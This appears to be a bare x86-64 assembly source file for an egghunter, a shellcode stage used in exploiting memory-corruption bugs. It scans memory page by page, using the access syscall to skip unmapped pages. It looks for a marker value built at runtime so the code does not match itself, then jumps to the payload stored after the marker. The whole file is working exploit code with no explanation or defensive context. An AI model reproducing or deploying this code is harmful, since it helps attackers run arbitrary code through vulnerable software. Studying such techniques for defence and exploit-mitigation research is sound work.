global _start
section .text
_start:
  ; Clearing registers
  xor rdx,rdx
  mov rsi, rdx
  ; enumerate pages

next_page:
  or dx, 0x0fff
  ; enumerate addresses in page

next_address:
  inc rdx

; determine if we can access page
determine_access:
  lea rdi, [rdx + 8]
  xor rax, rax
  add rax, 0x15
  syscall
  cmp al, 0xf2
  jz next_page

; check if we found egg
  mov eax, 0x43434342
  inc eax
  scasd
  jne next_address
  jmp rdi
